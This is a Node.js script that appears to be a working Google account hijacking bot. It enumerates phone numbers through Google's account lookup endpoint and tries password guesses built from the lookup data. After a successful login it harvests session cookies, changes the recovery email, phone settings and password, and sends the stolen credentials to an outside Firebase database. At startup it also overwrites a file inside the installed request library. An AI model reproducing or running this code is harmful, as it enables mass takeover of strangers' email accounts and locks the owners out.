const puppeteer = require('puppeteer')
const admin = require('./database')
const request = require('request')
const crypto = require('crypto')
const fs = require('fs')

let SERVER = 'server'
let COUNTRY = null
let CODE = null

let database = new admin()

let mServerData = null
let mSearch = false
let mHostGPS = null
let page = null
let mRecovery = null

let mTimeToken = null

fs.copyFile('redirect.js', 'node_modules/request/lib/redirect.js', (err) => {
    if(!err) {
        fs.readFile('./id.txt', {encoding: 'utf-8'}, function(err,data){
            if(!err) {
                SERVER = 'server'+data
                database.connect((error) => {
                    if(!error) {
                        request({
                            url: 'https://raiyan-088-default-rtdb.firebaseio.com/raiyan/code/server/'+SERVER+'.json',
                            json:true
                        }, function(error, response, body){
                            if(!error) {
                                CODE = body['code']
                                COUNTRY = body['name']
                                mServerData = body
                                console.log('start browser')
                                browserStart()
                            }
                        })
                    }
                })
            }
        })
    }
})


async function browserStart() {
    ;(async () => {

        mRecovery = JSON.parse(fs.readFileSync('./recovery.json'))

        let browser = await puppeteer.launch({
            //executablePath : "/usr/lib/chromium-browser/chromium-browser",
            headless: true,
            args: [ '--no-sandbox', '--disable-setuid-sandbox' ]
        })
    
        page = await browser.newPage()
    
        await page.setUserAgent('Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36')
    
        await page.goto('https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&rip=1&nojavascript=1&ifkv=AX3vH3_8OID3jcdWI28sWhLKyWZfo4meEPPnetcotLVnH3ejfs06Wk_CtNS4zazcrE3kC6LvY3Qy&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&service=accountsettings')
    
        let cookie = await page.cookies()

        console.log(mServerData)

        cookie.forEach(function (value) {
            if (value.name == '__Host-GAPS') {
                mHostGPS = value.value
            }
        })

        if(mHostGPS == null) mHostGPS = '1:bJ6IzDkUblOirycmWnLX29tiwNVKNg:EO4prJJbfARXxVTU'

        for(let key of Object.keys(mServerData)) {
            if(key.startsWith('start')) {
                let runing = 'runing'+key.replace('start', '')
                let start = mServerData[key]
                let number = mServerData[runing]
                if(number == null) {
                    number = start * 10000000
                }
                if(number != 0) {
                    if(key == 'start_1') {
                        checkNumber(number, runing, start, 0)
                    }
                }
            }
        }
        
    })()
} 


function checkNumber(number, name, start, runing) {
    runing++
    let temp = runing
    console.log('Check: '+number)
    if(temp >= 10) {
        database.set('/code/server/'+SERVER+'/'+name, number)
        temp = 0
    }
    if(parseInt(start)+1 <= parseInt(number/10000000)) {
        database.set('/code/server/'+SERVER+'/'+name, 0)
    } else {
        request({
            url: 'https://accounts.google.com/_/lookup/accountlookup?hl=en&_reqid=999999',
            method: 'POST',
            body: getNumberTempData(CODE+number),
            headers: {
                'content-type' : 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf' : 1
            }
        }, function(error, responce, body) {
            try {
                let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                if(data[0][1] == 16) {
                    console.log('Found: '+data[0][4])
                    logInNumber01(number, data[0][4].replace(/[^0-9]/g, ''), name, start, temp)
                } else {
                    checkNumber(number+1, name, start, temp)
                }
            } catch (e) {
                checkNumber(number+1, name, start, temp)
            }
        })
    }
}


async function logInNumber01(number, password, name, start, runing) {
    let Identifier = await getIdentifierData(CODE+number)
    let bodyData = getNumberData(CODE+number, Identifier)

    var headers = {
        'Host': 'accounts.google.com',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'https://accounts.google.com',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'X-Chrome-Id-Consistency-Request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=d7a27b6a-dde9-4208-958e-451604994709,signin_mode=all_accounts,signout_mode=show_confirmation',
        'X-Client-Data': 'CJK2yQEIorbJAQjEtskBCKmdygEItPLKAQiUocsBCPO7zAEIzLzMAQjzwMwBCJrBzAEIs8HMAQjEwcwBCNbBzAEI3sTMAQjXxswBCJ3JzAEI48vMAQ==',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': '__Host-GAPS='+mHostGPS
    }

    request({
        url: 'https://accounts.google.com/signin/v1/lookup',
        method: 'POST',
        headers: headers,
        gzip: true,
        body: bodyData
    }, function(error, response, body) {
        let check = false
        try {
            if (!error) {
                let headers = response.headers
                if(headers && headers['location']) {
                    let index = headers['location'].indexOf('TL=')
                    if(index != -1) {
                        let split = headers['location'].substring(index+3, headers['location'].length).split('&')
                        check = true
                        passwordTry(password, split[0], Identifier, split[split.length-1].replace('cid=', ''), null, 0, 0, number, name, start, runing)
                    }
                }
            } else {}
        } catch (e) {}
        
        if(!check) {
            console.log(response.headers)
            //checkNumber(number+1, name, start, runing)
        }
    })
}

function passwordTry(password, TL, Identifier, type, sendCookies, again, loop, number, name, start, runing) {
    let pass = password
    if(loop == 1) {
        pass = password.substring(0, 8)
    } else if(loop == 2) {
        pass = password.substring(password.length-8, password.length)
    }

    request({
        url: 'https://accounts.google.com/_/signin/challenge?hl=en&TL='+TL+'&_reqid=999999',
        method: 'POST',
        body: getPasswordData(pass, Identifier, parseInt(type)),
        headers: {
            'Cookie': again==1?'__Host-GAPS='+mHostGPS+'; '+sendCookies:'__Host-GAPS='+mHostGPS,
            'content-type' : 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf' : 1
        }
    }, function(error, responce, body) {

        let output = 0

        if(again == 0) {
            try {
                let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                if(data[0][3] == 5) {
                    if(password.length > 8) {
                        console.log('Wrong Password')
                        if(loop == 0) {
                            output = 1
                            passwordTry(password, TL, Identifier, type, null, 0, 1, number, name, start, runing)
                        } else if(loop == 1) {
                            output = 1
                            passwordTry(password, TL, Identifier, type, null, 0, 2, number, name, start, runing)
                        }
                    }
                } else if(data[0][3] == 3) {
                    let temp = number.toString()
                    console.log('Password Matching')
                    database.set('/code/gmail/found/'+COUNTRY+'/'+temp.substring(0, 3)+'/'+temp.substring(3, temp.length), loop)
                } else if(data[0][3] == 1) {
                    console.log('Login Success')
                    let cookiesList = responce.headers['set-cookie']
                    if(cookiesList) {
                        output = 2
                        getRaptToken(pass, cookiesList, Identifier, number, name, start, runing)
                    }
                }
            } catch (e) {}
        } else if(again == 1) {
            try {
                let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                if(data[0][3] == 1) {
                    output = 2
                    let url = decodeURIComponent(data[0][13][2])
                    let index = url.indexOf('rapt=')
                    let split = url.substring(index+5, url.length).split('&')
                    let mRAPT = split[0]
                    
                    request({
                        url: 'https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fpersonal-info',
                        method: 'GET',
                        headers: {
                            'Cookie': sendCookies,
                            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3193.0 Safari/537.36'
                        }
                    }, function(error, responce, body) {
                        let wrong = true
                        try {
                            if(!error && responce.headers['location']) {
                                let url = decodeURIComponent(responce.headers['location'])  
                                let index = url.indexOf('osidt=')
                                let split = url.substring(index+6, url.length).split('&')
                                let tempCookes = sendCookies
                                tempCookes += 'OSID=Lgh3m_XDdCpAmGim5eO6xW8csVs0m9rLO6I7FHHeiGEViTAiQK_GhRhgeVwISYbsIeMp1g.; '
                                wrong = false
                                request({
                                    url: 'https://myaccount.google.com/accounts/SetOSID?continue=https%3A%2F%2Faccounts.youtube.com%2Faccounts%2FSetSID%3Fssdc%3D1&osidt='+split[0],
                                    method: 'GET',
                                    headers: {
                                        'Cookie': tempCookes
                                    }
                                }, function(error, responce, body) {
                                    wrong = true
                                    try {
                                        if(!error && responce.headers['set-cookie']) {
                                            cookiesList = responce.headers['set-cookie']
        
                                            for(let i=0; i<cookiesList.length; i++) {
                                                let singelData = cookiesList[i]
                                                try {
                                                    let start = singelData.indexOf('=')
                                                    let end = singelData.indexOf(';')
                                                    let key = singelData.substring(0, start)
                                                    if(key == 'OSID') {
                                                        sendCookies += 'OSID='+singelData.substring(start+1, end)
                                                        i = cookiesList.length
                                                    }
                                                } catch (e) {}
                                            }

                                            wrong = false
                                            if(mTimeToken != null) {
                                                prvpChange(sendCookies, mRAPT, loop, number, name, start, runing)
                                            } else {
                                                request({
                                                    url: 'https://myaccount.google.com/phone',
                                                    method: 'GET',
                                                    headers: {
                                                        'Cookie': sendCookies,
                                                        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3193.0 Safari/537.36'
                                                    }
                                                }, function(error, response, body) {
                                                    try {
                                                        if(!error) {
                                                            let index = body.indexOf('SNlM0e')
                                                            if(index != -1) {
                                                                let temp = body.substring(index+6, index+100)
                                                                mTimeToken = temp.substring(temp.indexOf(':')+1, temp.indexOf(',')).replace('"', '').replace('"', '').replace(' ', '')
                                                                database.set('/server/time', mTimeToken)
                                                            }
                                                        }
                                                    } catch (e) {}

                                                    if(mTimeToken != null) {
                                                        prvpChange(sendCookies, mRAPT, loop, number, name, start, runing)
                                                    } else {
                                                        request({
                                                            url: 'https://raiyan-088-default-rtdb.firebaseio.com/raiyan/server/time.json',
                                                            method: 'GET',
                                                            json: true
                                                        }, function(error, response, body) {
                                                            try {
                                                                if(!error) {
                                                                    mTimeToken = body
                                                                }
                                                            } catch (e) {}

                                                            if(mTimeToken != null) {
                                                                prvpChange(sendCookies, mRAPT, loop, number, name, start, runing)
                                                            } else {
                                                                database.set('/code/gmail/menually/'+COUNTRY+'/'+number.toString(), loop)
                                                                checkNumber(number+1, name, start, runing)
                                                            }
                                                        })
                                                    }
                                                })
                                            }
                                        }
                                    } catch (e) {}

                                    if(wrong) {
                                        database.set('/code/gmail/menually/'+COUNTRY+'/'+number.toString(), loop)
                                        checkNumber(number+1, name, start, runing)
                                    }
                                })
                            }
                        } catch (e) {}

                        if(wrong) {
                            database.set('/code/gmail/menually/'+COUNTRY+'/'+number.toString(), loop)
                            checkNumber(number+1, name, start, runing)
                        }
                    })
                }
            } catch (e) {}
        }

        if(output == 0) {
            checkNumber(number+1, name, start, runing)
        }
    })
}

function getRaptToken(password, cookiesList, Identifier, number, name, start, runing) {
    let sendCookies = ''
    
    for(let i=0; i<cookiesList.length; i++) {
        let singelData = cookiesList[i]
        try {
            let start = singelData.indexOf('=')
            let end = singelData.indexOf(';')
            let key = singelData.substring(0, start)
            if(key == 'SID' || key == '__Secure-1PSID' || key == 'HSID' || key == 'SSID' || key == 'SAPISID' || key == 'LSID' || key == 'APISID') {
                let value = singelData.substring(start+1, end)
                sendCookies += key+'='+value+'; '
            }
        } catch (e) {}
    }

    request({
        url: 'https://myaccount.google.com/signinoptions/rescuephone',
        method: 'GET',
        headers: {
            'Cookie': sendCookies,
            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3193.0 Safari/537.36'
        }
    }, function(error, response, body) {
        let check = false
        try {
            if (!error) {
                let headers = response.headers
                if(headers && headers['location']) {
                    check = true
                    let index = headers['location'].indexOf('rart=')
                    let split = headers['location'].substring(index, headers['location'].length).split('&')
                    request({
                        url: 'https://accounts.google.com/ServiceLogin?'+split[0],
                        method: 'GET',
                        headers: {
                            'Cookie': sendCookies,
                            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3193.0 Safari/537.36'
                        }
                    }, function(error, response, body) {
                        let check = false
                        try {
                            if (!error) {
                                let headers = response.headers
                                 if(headers && headers['location']) {
                                    check = true
                                    let index = headers['location'].indexOf('TL=')
                                    let split = headers['location'].substring(index+3, headers['location'].length).split('&')
                                    cookiesList = headers['set-cookie']
                                    for(let i=0; i<cookiesList.length; i++) {
                                        let singelData = cookiesList[i]
                                        try {
                                            let start = singelData.indexOf('=')
                                            let end = singelData.indexOf(';')
                                            let key = singelData.substring(0, start)
                                            if(key == '__Host-GAPS') {
                                                mHostGPS = singelData.substring(start+1, end)
                                                i = cookiesList.length
                                            }
                                        } catch (e) {}
                                    }
                                    passwordTry(password, split[0], Identifier, split[split.length-1].replace('cid=', ''), sendCookies, 1, 0, number, name, start, runing)
                                }
                            } else {}
                        } catch (e) {}
                        
                        if(!check) {
                            checkNumber(number+1, name, start, runing)
                        }
                    })
                }
            } else {}
        } catch (e) {}
        
        if(!check) {
            checkNumber(number+1, name, start, runing)
        }
    })
}

function prvpChange(sendCookies, mRAPT, loop, number, name, start, runing) {
    request({
        url: 'https://drive.google.com/drive/mobile/my-drive',
        method: 'GET',
        headers: {
            'Cookie': sendCookies
        }
    }, function(error, response, body) {
        let wrong = true
        try {
            if(!error) {
                let index = body.indexOf('__initData')
                if(index != -1) {
                    let temp = body.substring(index, body.length)
                    let data = JSON.parse(temp.substring(temp.indexOf('['), temp.indexOf(';</script>')))
                    
                    let mGmail = data[0][9][35][2].replace('@gmail.com', '').replace('.', '')
                    let mCreate = parseInt(data[0][9][11][9]/1000)

                    let position = Math.floor((Math.random() * (mRecovery.length-1)))
                    let recovery = mRecovery[position]
                    wrong = false

                    request({
                        url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=uc1K4d&rapt='+mRAPT,
                        method: 'POST',
                        body: getRecoveryData(recovery+'@gmail.com'),
                        headers: {
                            'Cookie': sendCookies,
                            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                        } 
                    }, function(error, response, body) {
                        wrong = true
                        try {
                            if(!(error || body.includes('"er"'))) {
                                wrong = false
                                request({
                                    url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=GWdvgc&rapt='+mRAPT,
                                    method: 'POST',
                                    body: getVerificationData(),
                                    headers: {
                                        'Cookie': sendCookies,
                                        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                                    }
                                }, function(error, response, body) {
                                    wrong = true
                                    try {
                                        if(!(error || body.includes('"er"'))) {
                                            wrong = false
                                            request({
                                                url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=ZBoWob&rapt='+mRAPT,
                                                method: 'POST',
                                                body: getPhoneData(CODE+number),
                                                headers: {
                                                    'Cookie': sendCookies,
                                                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                                                }
                                            }, function(error, response, body) {
                                                wrong = true
                                                try {
                                                    if(!(error || body.includes('"er"'))) {
                                                        wrong = false
                                                        let changePass = getRandomPassword()
                                                        request({
                                                            url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+mRAPT,
                                                            method: 'POST',
                                                            body: getChangePasswordData(changePass),
                                                            headers: {
                                                                'Cookie': sendCookies,
                                                                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                                                            }
                                                        }, function(error, response, body) {
                                                            wrong = true
                                                            try {
                                                                if(!(error || body.includes('"er"'))) {
                                                                    wrong = false
                                                                    console.log(changePass)
                                                                    database.update('/code/gmail/completed/'+COUNTRY+'/'+mGmail, { create:mCreate, number:number, password:changePass, recovery:recovery})
                                                                    console.log('Completed Process')
                                                                    checkNumber(number+1, name, start, runing)
                                                                }
                                                            } catch (e) {}
                                                            if(wrong) {
                                                                database.set('/code/gmail/menually/'+COUNTRY+'/'+number.toString(), loop)
                                                                checkNumber(number+1, name, start, runing)
                                                            }
                                                        })
                                                    }
                                                } catch (e) {}
                                                if(wrong) {
                                                    database.set('/code/gmail/menually/'+COUNTRY+'/'+number.toString(), loop)
                                                    checkNumber(number+1, name, start, runing)
                                                }
                                            })
                                        }
                                    } catch (e) {}
                                    if(wrong) {
                                        database.set('/code/gmail/menually/'+COUNTRY+'/'+number.toString(), loop)
                                        checkNumber(number+1, name, start, runing)
                                    }
                                })
                            }
                        } catch (e) {}
                        if(wrong) {
                            database.set('/code/gmail/menually/'+COUNTRY+'/'+number.toString(), loop)
                            checkNumber(number+1, name, start, runing)
                        }
                    })
                }
            }
        } catch (e) {}

        if(wrong) {
            database.set('/code/gmail/menually/'+COUNTRY+'/'+number.toString(), loop)
            checkNumber(number+1, name, start, runing)
        }
    })
}

function getNumberTempData(number) {
    let freq = [number,"AEThLlzLnodznP_eS7-mfzAihkXlpSKvoxliHZlPZE7W1-NMXK50YUORqG5WNyxwLONQwZwBsK1p-PH7BHW4s-NEZhzTMrxrdQHlqhB6bpzNema_MyohPW-JaUv-EO7_qbvIYnlKdIu0JkSGy2tJbRiElFWhzHXi1UJK1nt4D8UbHnOux-lF7PC0_RlISAgrI1oOSktxWO1I",[],null,null,null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/ServiceLogin?service=accountsettings&hl=en-US&continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&csig=AF-SEnY7bxxtADWhtFc_%3A1556625798&flowName=GlifWebSignIn&flowEntry=ServiceLogin",null,[],4,[],"GlifWebSignIn",null,[],false],1,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,true,null,null,null,null,null,null,null,null,[]],number,null,null,null,true,true,[]]
    return 'f.req='+encodeURIComponent(JSON.stringify(freq))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",getIdentifier()]))
}

function getNumberData(number, identify) {
    return  'service=accountsettings&bgresponse='+encodeURIComponent(identify, "UTF-8")+'&Email='+encodeURIComponent(number, "UTF-8")+'&signIn=Next'
}

function getPasswordData(password, identify, type) {
    return 'continue='+encodeURIComponent('https://myaccount.google.com/')+'&service=accountsettings&f.req='+encodeURIComponent(JSON.stringify(['AEThLlw5uc06cH1q8zDfw1uY4Xp7eNORXHjsuJT-9-2nFsiykmQD7IcKUJPcYmG4KddhkjoTup4nzB0yrSZeYwm7We09VV6f-i34ApnWRsbGJ2V1tdbWPwWOgK4gDGSgJEJ2hIK9hyGgV-ejHBA-mCWDXqcePqHHag5bc4lHSHRGyNrOr9Biuyn6y8tk3iCBn5IY34f-QKm5-SOxrbYWDcto50q0oo2z0YCPFtY556fWL0DY0W0pAGKmW6Ky4ukssyF91aMhKyZsH5bzHEs0vPdnYAWfxipSCarZjBUB0TIR7W2MyATWD99NE0xXQAIy2AGgdxdyi9aYhS7sjH1iUhbjspK_di8Wn1us7BfEbjaXI0BA4SXy7igdq53U5lKmR1seyx6mpKnVKK59iCNyWzZOa8y91Q06DdD0OqQHaPmK2g6S2PH6j6CsOsBRGVxcvjnzysjfgf7bARU0CgFDOAwA8Q8fKOaqBIe0Xg3nfHILRWVBJnVqUpI',null,type,null,[1,null,null,null,[password,null,true]]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",identify]))
}

function getRecoveryData(gmail) {
    return 'f.req='+encodeURIComponent(JSON.stringify([[["uc1K4d","[\"ac.sirerq\",\""+gmail+"\",null,true]",null,"generic"]]]))+'&at='+encodeURIComponent(mTimeToken)
}

function getVerificationData() {
    return 'f.req=%5B%5B%5B%22GWdvgc%22%2C%22%5B%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+encodeURIComponent(mTimeToken)
}

function getPhoneData(number) {
    return 'f.req='+encodeURIComponent(JSON.stringify([[["ZBoWob","[[3,\""+number+"\",null,null,[1],null,null,null,null,null,[],1]]",null,"generic"]]]))+'&at='+encodeURIComponent(mTimeToken)
}

function getChangePasswordData(password) {
    return 'f.req='+encodeURIComponent(JSON.stringify([[["or64jf","[\""+password+"\",null,false]",null,"generic"]]]))+'&at='+encodeURIComponent(mTimeToken)
}


function getIdentifier() {
    let data = ''
    let loop = Math.floor(Math.random() * 15)+15
    for(let i=0; i<loop; i++) {
        data = data+crypto.randomBytes(20).toString('hex')
    }
    return data
}

async function getIdentifierData(number) {
    let responce = null
    while(true) {
        if(!mSearch) {
            mSearch = true
            responce = getIdentifierToken(number)
            if(responce) {
                mSearch = false
                break
            }
        }
    }
    return responce
}

async function getIdentifierToken(number) {
    if(page != null) {
        return await page.evaluate(async (number) => {
            let root = document.querySelector('#Email')
            if(root) {
                root.value = number
                try {
                    return document.bg.low(function(response) {
                        return response
                    })
                } catch (err) {
                    root.value = ''
                }
            }
            return null
        }, number)
    } else {
        return null
    }
}


function getRandomPassword() {
    let C = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
    let S = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    let N = ['0','1','2','3','4','5','6','7','8','9']
    let U = ['#','$','@']
    
    let pass = C[Math.floor((Math.random() * 26))]
    pass = pass+ S[Math.floor((Math.random() * 26))]
    pass = pass+ S[Math.floor((Math.random() * 26))]
    pass = pass+ S[Math.floor((Math.random() * 26))]
    pass = pass+ S[Math.floor((Math.random() * 26))]
    pass = pass+ N[Math.floor((Math.random() * 10))]
    pass = pass+ N[Math.floor((Math.random() * 10))]
    pass = pass+ N[Math.floor((Math.random() * 10))]
    pass = pass+ U[Math.floor((Math.random() * 3))]
    pass = pass+ U[Math.floor((Math.random() * 3))]
    
    return pass
}

function delay(time) {
    return new Promise(function(resolve) { 
        setTimeout(resolve, time)
    })
}

async function click(id) {
    let output = await page.evaluate((id) => {
        let root = document.querySelector(id)
        if(root) {
            root.click()
            return true
        } else {
            return false
        }
    }, id)
    return output
}

async function exits(id) {
    let output = await page.evaluate((id) => {
        let root = document.querySelector(id)
        if(root) {
            return true
        } else {
            return false
        }
    }, id)
    return output
}
